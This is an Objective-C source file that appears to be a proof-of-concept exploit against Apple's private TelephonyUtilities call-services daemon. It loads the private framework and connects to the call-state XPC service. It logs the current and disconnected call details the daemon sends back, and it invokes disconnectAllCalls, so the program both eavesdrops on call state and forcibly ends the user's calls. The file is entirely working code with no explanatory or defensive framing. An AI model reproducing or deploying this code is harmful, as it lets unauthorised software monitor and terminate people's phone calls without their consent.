#import <stdio.h>
#import <stdint.h>
#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <objc/runtime.h>
#import <objc/message.h>
#import <dlfcn.h>


@protocol TUCallServicesProxyCallActions <NSObject> // 0x1ddd710b0
/* instance methods */
- (void)swapCalls;
- (void)pushHostedCallsToDestination:(id)arg1;
- (void)setSharingScreen:(BOOL)arg1 attributes:(id)arg2 forCallWithUniqueProxyIdentifier:(id)arg3;
- (void)pullRelayingCallsFromClient;
- (void)playDTMFToneForCallWithUniqueProxyIdentifier:(id)arg1 key:(unsigned char)arg2;
- (void)pushRelayingCallsToHostWithSourceIdentifier:(id)arg1;
- (void)setSharingScreen:(BOOL)arg1 forCallWithUniqueProxyIdentifier:(id)arg2;
- (void)setDownlinkMuted:(BOOL)arg1 forCallWithUniqueProxyIdentifier:(id)arg2;
- (void)enteredForegroundForCallWithUniqueProxyIdentifier:(id)arg1;
- (void)setUplinkMuted:(BOOL)arg1 forCallWithUniqueProxyIdentifier:(id)arg2;
- (void)holdCallWithUniqueProxyIdentifier:(id)arg1;
- (void)pullHostedCallsFromPairedHostDevice;
- (void)groupCallWithUniqueProxyIdentifier:(id)arg1 withOtherCallWithUniqueProxyIdentifier:(id)arg2;
- (void)answerCallWithRequest:(id)arg1;
- (void)activateInCallUIWithActivityContinuationIdentifier:(id)arg1;
- (void)sendUserScoreToRTCReporting:(id)arg1 withScore:(int)arg2;
- (void)disconnectCurrentCallAndActivateHeld;
- (void)shouldSuppressInCallStatusBar:(BOOL)arg1;
- (void)shouldAllowRingingCallStatusIndicator:(BOOL)arg1;
- (void)enteredBackgroundForAllCalls;
- (void)setMixesVoiceWithMedia:(BOOL)arg1 forCallWithUniqueProxyIdentifier:(id)arg2;
- (void)setIsSendingVideo:(BOOL)arg1 forCallWithUniqueProxyIdentifier:(id)arg2;
- (void)setRemoteVideoPresentationSizeForCallWithUniqueProxyIdentifier:(id)arg1 size:(struct CGSize { double x0; double x1; })arg2;
- (void)setRemoteVideoPresentationStateForCallWithUniqueProxyIdentifier:(id)arg1 presentationState:(int)arg2;
- (void)requestVideoUpgradeForCallWithUniqueProxyIdentifier:(id)arg1;
- (void)disconnectAllCalls;
- (void)sendMMIOrUSSDCodeWithRequest:(id)arg1;
- (void)ungroupCallWithUniqueProxyIdentifier:(id)arg1;
- (void)updateCallWithProxy:(id)arg1;
- (void)unholdCallWithUniqueProxyIdentifier:(id)arg1;
- (void)sendHardPauseDigitsForCallWithUniqueProxyIdentifier:(id)arg1;
- (void)disconnectCallWithUniqueProxyIdentifier:(id)arg1;
- (void)setScreenShareAttributesForCallWithUniqueProxyIdentifier:(id)arg1 attributes:(id)arg2;
- (void)setBluetoothAudioFormatForCallWithUniqueProxyIdentifier:(id)arg1 bluetoothAudioFormat:(long long)arg2;
- (void)setTTYType:(int)arg1 forCallWithUniqueProxyIdentifier:(id)arg2;
- (void)willEnterBackgroundForAllCalls;
@end

@protocol TUCallCenterXPCServer <TUCallServicesProxyCallActions> // 0x1ddd72020
/* instance methods */
- (void)joinConversationWithRequest:(id)arg1;
- (void)shouldSuppressInCallStatusBar:(BOOL)arg1;
- (void)shouldAllowRingingCallStatusIndicator:(BOOL)arg1;
- (void)startTransmissionForBargeCall:(id)arg1 sourceIsHandsfreeAccessory:(BOOL)arg2;
- (void)reportLocalPreviewStoppedForCallWithUniqueProxyIdentifier:(id)arg1;
- (void)pullPersistedChannel:(id /* block */)arg1;
- (void)stopTransmissionForBargeCall:(id)arg1 sourceIsHandsfreeAccessory:(BOOL)arg2;
- (void)requestInitialState:(id /* block */)arg1;
- (void)dialWithRequest:(id)arg1 displayContext:(id)arg2;
- (void)dialWithRequest:(id)arg1 reply:(id /* block */)arg2;
- (void)pullCallFromClientUsingHandoffActivityUserInfo:(id)arg1 reply:(id /* block */)arg2;
@end

@protocol TURouteControllerXPCServer <NSObject> // 0x1ddd72080
/* instance methods */
- (void)localRoutesByUniqueIdentifier:(id /* block */)arg1;
- (void)pairedHostDeviceRoutesByUniqueIdentifier:(id /* block */)arg1;
- (void)pickLocalRouteWithUniqueIdentifier:(id)arg1 shouldWaitUntilAvailable:(BOOL)arg2;
- (void)pickPairedHostDeviceRouteWithUniqueIdentifier:(id)arg1 shouldWaitUntilAvailable:(BOOL)arg2;
@end

@protocol TUCallFilterControllerXPCServer <NSObject> // 0x1ddd720e0
/* instance methods */
- (void)willRestrictAddresses:(id)arg1 forBundleIdentifier:(id)arg2 reply:(id /* block */)arg3;
- (void)containsRestrictedHandle:(id)arg1 forBundleIdentifier:(id)arg2 performSynchronously:(BOOL)arg3 reply:(id /* block */)arg4;
- (void)shouldRestrictAddresses:(id)arg1 forBundleIdentifier:(id)arg2 performSynchronously:(BOOL)arg3 reply:(id /* block */)arg4;
- (void)filterStatusForAddresses:(id)arg1 forBundleIdentifier:(id)arg2 reply:(id /* block */)arg3;
- (void)policyForAddresses:(id)arg1 forBundleIdentifier:(id)arg2 reply:(id /* block */)arg3;
- (void)isUnknownAddress:(id)arg1 normalizedAddress:(id)arg2 forBundleIdentifier:(id)arg3 reply:(id /* block */)arg4;
@end

@protocol TUCallServicesClientCapabilitiesXPCServer <NSObject> // 0x1ddd71110
/* instance methods */
- (void)setClientCapabilities:(id)arg1;
@end

@protocol TUAudioDeviceControllerXPCServer <NSObject> // 0x1ddd703c0
/* instance methods */
- (void)setCurrentAudioOutputDeviceToDeviceWithUID:(id)arg1;
- (void)setCurrentAudioInputDeviceToDeviceWithUID:(id)arg1;
@end


@protocol TUCallServicesXPCServer <TUCallCenterXPCServer, TUCallServicesClientCapabilitiesXPCServer, TUAudioDeviceControllerXPCServer, TURouteControllerXPCServer, TUCallFilterControllerXPCServer> // 0x1ddd72140
@end

@class TUProxyCall;

@protocol TUCallCenterXPCClient  // 0x1ddd70f90
/* instance methods */
- (void)resetCallProvisionalStates;
- (void)handleNotificationName:(id)arg1 forCallWithUniqueProxyIdentifier:(id)arg2 userInfo:(id)arg3;
- (void)handleCurrentCallsChanged:(id)arg1 callDisconnected:(id)arg2;
- (void)handleFrequencyChangedTo:(id)arg1 inDirection:(int)arg2 forCallsWithUniqueProxyIdentifiers:(id)arg3;
- (void)handleMeterLevelChangedTo:(float)arg1 inDirection:(int)arg2 forCallsWithUniqueProxyIdentifiers:(id)arg3;
@end

@protocol TURouteControllerXPCClient <NSObject> // 0x1ddd70ff0
/* instance methods */
- (void)handlePairedHostDeviceRoutesByUniqueIdentifierUpdated:(id)arg1;
- (void)handleLocalRoutesByUniqueIdentifierUpdated:(id)arg1;
@end

@protocol TUCallServicesXPCClient <TUCallCenterXPCClient, TURouteControllerXPCClient> // 0x1ddd71050
@end


@interface MyTUCallServicesInterface: NSObject
@end

@implementation MyTUCallServicesInterface

- (instancetype)init {
    self = [super init];
    if (self) {
        [self doJOB];
    }
    return self;
}

- (void)handleCurrentCallsChanged:(id)call callDisconnected:(id)disc {
	NSLog(@"call: %@",call);
    NSLog(@"disc: %@",disc);
}

- (void)handleNotificationName:(id)arg1 forCallWithUniqueProxyIdentifier:(id)arg2 userInfo:(id)arg3 {}
- (void)resetCallProvisionalStates {}
- (void)handleFrequencyChangedTo:(id)arg1 inDirection:(int)arg2 forCallsWithUniqueProxyIdentifiers:(id)arg3 {}
- (void)handleMeterLevelChangedTo:(float)arg1 inDirection:(int)arg2 forCallsWithUniqueProxyIdentifiers:(id)arg3 {}

-  (void)doJOB {
    
    void *lib = dlopen("/System/Library/PrivateFrameworks/TelephonyUtilities.framework/TelephonyUtilities", 2);
    if(!lib) return;

    NSString *service = @"com.apple.telephonyutilities.callservicesdaemon.callstatecontroller";
    Protocol *TUCallCenterXPCServer_protocol = objc_getProtocol("TUCallCenterXPCServer");;
    Protocol *TUCallServicesXPCClient_protocol = objc_getProtocol("TUCallServicesXPCClient");
    Class TUProxyCall_class = objc_getClass("TUProxyCall");

    NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:(TUCallCenterXPCServer_protocol)];
    NSXPCInterface *exportedInterface = [NSXPCInterface interfaceWithProtocol:(TUCallServicesXPCClient_protocol)];

    NSSet *expectedClasses = [NSSet setWithObjects:TUProxyCall_class,[NSArray class],[NSString class], nil];
   [exportedInterface setClasses:expectedClasses forSelector: @selector(handleCurrentCallsChanged:callDisconnected:) argumentIndex:0 ofReply:NO];
  
    NSXPCConnection *conn = [[NSXPCConnection alloc]initWithMachServiceName:service options:0];
    if (!conn) return;
	
    [conn setRemoteObjectInterface:remoteInterface];
    [conn setExportedInterface:exportedInterface];
    [conn setExportedObject:self];
    [conn resume];
	

    id obj = [conn remoteObjectProxyWithErrorHandler:^(NSError* error){
        NSLog(@"remoteObjectProxyWithErrorHandler %@",error);
    }];

    [conn setInterruptionHandler:^{
        NSLog(@"connection terminated");
    }];

    [conn setInvalidationHandler:^{
        NSLog(@"connection invalid");
    }];
    
    //force connection 
    [obj disconnectAllCalls];
    
    CFRunLoopRun();
}
@end


int main(int argc, char **argv) {
	
	 [MyTUCallServicesInterface new];
     return 0;
}
